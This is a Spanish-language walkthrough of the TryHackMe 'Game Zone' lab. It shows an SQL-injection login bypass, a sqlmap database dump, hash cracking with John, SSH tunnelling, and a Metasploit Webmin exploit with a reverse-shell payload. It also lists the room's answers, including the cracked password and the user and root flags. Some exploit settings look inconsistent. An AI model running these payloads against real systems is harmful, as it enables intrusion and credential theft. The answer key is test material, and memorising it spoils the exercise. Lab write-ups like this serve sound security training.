---
title: "Game Zone — Recorrido por la sala TryHackMe"
description: "Game Zone es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de inyección SQL, descifrar un hash para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un pivoteo y escalar tus privilegios."
date: "2025-11-26"
published: true
tags: ["tryhackme", "pentesting", "writeup", "webmin", "sqli", "pivoting"]
readTime: "20 min"
---
## Introduccion

**Game Zone** es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de **inyección SQL**, **descifrar un hash** para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un **pivoteo** y escalar tus **privilegios**.

---

## ⚙️ Configuración

Agregamos la IP de la sala a nuestro archivo hosts sera nuestra maquina que corramos en ese instante de igual forma tryhackme es la que nos da la ip de la maquina que vamos a explotar:

```bash
echo "10.64.144.150 game-zone.tryhackme.com" >> /etc/hosts
```
Realizmos un ping a la sala para verificar que la IP se haya agregado correctamente:

```bash
ping game-zone.tryhackme.com
```

## Desplegar la máquina vulnerable

Para encontrar el nombre del avatar de dibujos animados en cuestión, podemos realizar una *búsqueda inversa* de imágenes utilizando la búsqueda visual de google.

## 🔎 Escaneo Inicial con Nmap

Sigamos la metodología de una prueba de penetración real detectando primero los puertos abiertos cin sus respectivas versiones y luego intentando explotarlos.

```bash
nmap -sVC -p- -Pn -T5 --min-rate 25000 10.64.144.150
```

Despues del escaneo con nmap podemos ver que tiene el puerto 80 abierto corriendo un servidor web apache.

## ⚡ Enumeración de servicios y versiones.

**HTTP**

Echemos un vistazo rápido utilizando la extension de **wappalyzer** para identificar las tecnologias usadas y sus versiones o tambien podemos usar **whatweb -v <IP>** directamenta en la terminal y nos dara los mismos resultados que **wappalyzer**

Aquí, **wappalyzer** nos proporcionó información útil como la siguiente:

- El servidor web utilizado y su versión (Apache 2.4.18)
- El lenguaje de programación de back-end (PHP)
- El sistema operativo utilizado por el servidor web (Ubuntu)
Con base en la información recopilada anteriormente, podemos realizar una investigación de vulnerabilidades para comprobar si la versión del servidor Apache es vulnerable o no.

## Investigación sobre vulnerabilidad

Aquí vamos a utilizar una herramienta llamada searchsploit :

 ```bash
 searchsploit apache 2.4
 ```

Lamentablemente, no se ha encontrado ninguna vulnerabilidad relacionada con la versión de Apache del objetivo.

Sin embargo, si presta atención a la página web anterior, es posible que haya notado un formulario de inicio de sesión de usuario.

Aquí reside una posible vulnerabilidad, ya que se puede introducir el nombre de usuario como otra consulta SQL . Esto permitirá escribir, insertar y ejecutar la consulta.

Más específicamente, esta vulnerabilidad se denomina vulnerabilidad de inyección SQL.

## Inyección SQL

Encontramos un formulario de autenticación básico. Probamos inyección SQL manual:

 ```bash
user: 'or 1=1--
password: <vacío>
 ```

Como podemos ver, la inyección SQL ha funcionado correctamente permitiendo el bypass de login. Ahora, necesitamos obtener acceso inicial al sistema objetivo.

## Pregunta 
When you've logged in, what page do you get redirected to?
**Respuesta: portal.php**

## 🕷️ Capturando Petición con Burp Suite

Antes de ejecutar automatización, interceptamos la solicitud POST para analizarla en detalle.

En Burp Suite:

- Activamos proxy

- Iniciamos sesión con el payload

- Guardamos la solicitud como responder.txt

## 💉 Explotación Automatizada con SQLmap

Utilizamos SQLmap para explotar la inyección SQL:

```bash
sqlmap -r responder.txt --dbms=mysql --dump
```
## Pregunta 

In the users table, what is the hashed password?

**Respuesta: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14**

What was the username associated with the hashed password?

**Respuesta: agent47**

What was the other table name?

**Respuesta: post**

El volcado muestra credenciales:

```bash
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

## 🔓 Cracking de Hash con John

Guardamos el hash en hash.txt y lo crackeamos con John:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
## Pregunta 

What is the de-hashed password?

**Respuesta: videogamer124**

John nos muestra la contraseña:

```bash
videogamer124
```
What is the user flag?

**Respuesta: 649ac17b1480ac13ef1e4fa579dac95c**

## 🧑‍💻 Acceso por SSH

Con las credenciales válidas:

```bash
ssh agent47@10.64.144.150
```

Una vez dentro, obtenemos la flag del usuario:

```bash
cat user.txt
```

## Enumeración Interna del Sistema

Validamos servicios activos:

```bash
ss -tulpn
```

Detectamos que está escuchando Webmin en un puerto accesible solo localmente.

## Pregunta 

How many TCP sockets are running?

**Respuesta: 5**

What is the name of the exposed CMS?

**Respuesta: Webmin**  

What is the CMS version?

**Respuesta: 1.580**

## 🔁 Túnel SSH para Acceder a Webmin

Creamos un túnel SSH de puerto local hacia la instancia remota:

```bash
ssh -L 10000:localhost:10000 agent47@10.64.144.150
```

Luego accedemos desde el navegador:

```bash
http://localhost:10000
```
## 💣 Explotación de Webmin con Metasploit (versión 1.580)

Abrimos Metasploit:

```bash
msfconsole
```

Buscamos módulos vulnerables:

```bash
searchsploit webmin
```

Seleccionamos el exploit:

```bash
use exploit/unix/webapp/webmin_backdoor
```

Configuramos parámetros:

```bash
set RHOST localhost
set LHOST 10.64.144.150
set USERNAME agent47
set PASSWORD videogamer124
set PAYLOAD cmd/unix/reverse
set SSL false
run
```

## Pregunta Final

What is the root flag?

**Respuesta: a4b945830144bdd71908d12d902adeee**

## 🎉 Conclusión

La máquina Gamer Zone combina varios vectores importantes:

- Inyección SQL clásica

- Cracking de hashes

- Acceso SSH

- Túneles locales para acceder a servicios internos

- Explotación de Webmin con Metasploit


Es un excelente laboratorio para perfeccionar técnicas de acceso inicial y escalada de privilegios en entornos controlados.

